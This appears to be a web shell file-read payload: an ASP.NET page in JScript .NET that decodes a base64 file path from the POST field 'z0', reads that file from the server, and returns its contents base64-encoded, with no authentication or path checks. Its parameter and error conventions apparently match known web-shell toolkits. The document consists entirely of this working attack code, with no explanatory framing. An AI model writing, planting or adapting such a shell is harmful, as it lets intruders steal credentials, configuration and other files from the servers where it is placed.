<%

function base64Decode(str) {
    if (!str || str == "")
        return "";
        
    var bytes = System.Convert.FromBase64String(str);

    return System.Text.Encoding.UTF8.GetString(bytes);
}

var szFilePath = base64Decode(Request.Form["z0"]);

try {
    var fileBytes = System.IO.File.ReadAllBytes(szFilePath);
    var base64Result = System.Convert.ToBase64String(fileBytes);
    
    Response.Write(base64Result);
}
catch (ex) {
    Response.Write("ERROR://" + ex.Message);
}

%>